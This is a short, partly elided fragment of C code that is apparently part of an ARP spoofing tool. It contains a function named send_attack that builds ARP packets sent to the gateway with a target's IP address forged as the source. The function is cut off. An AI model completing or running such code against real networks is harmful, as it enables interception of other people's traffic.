...
int send_attack(int sfd, int ifindex, struct in_addr *traget, send_arping_t *gatWaybuf)
{
    send_arping_t sbuf;
    int ret, i = 0;
    struct sockaddr_ll to;
    ...
    memcpy(sbuf.ehdr.h_dest, gatWaybuf->src_hw, ETH_ALEN);
    ...
    sbuf.src_ip = *traget;
    memcpy(sbuf.dst_hw, gatWaybuf->src_hw, ETH_ALEN);
    sbuf.dst_ip = gatWaybuf->src_ip;
    package(sbuf.trailer, htons(0), sizeof(sbuf.trailer));
